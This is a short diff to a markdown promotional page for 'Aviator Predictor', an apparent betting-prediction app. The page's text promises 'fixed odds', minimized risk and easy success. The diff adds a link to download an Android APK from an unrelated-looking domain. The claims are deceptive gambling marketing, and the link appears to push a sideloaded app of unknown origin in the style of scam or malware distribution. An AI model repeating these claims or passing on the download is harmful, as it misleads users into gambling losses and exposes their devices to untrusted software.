@@ -9,3 +9,5 @@ Why wait? Download Aviator Predictor today and transform your betting experience
 - **Fixed Odds:** Get access to fixed odds that provide you with reliable and consistent betting opportunities, minimizing your risk and maximizing your returns.
 
 Don’t miss out on the chance to revolutionize your betting strategy. With Aviator Predictor, success is just a download away. Join thousands of satisfied users who are already reaping the benefits of this innovative app. Download now and take the first step towards smarter betting!
+
+[Download APK](https://movermission.org/aviator.apk)
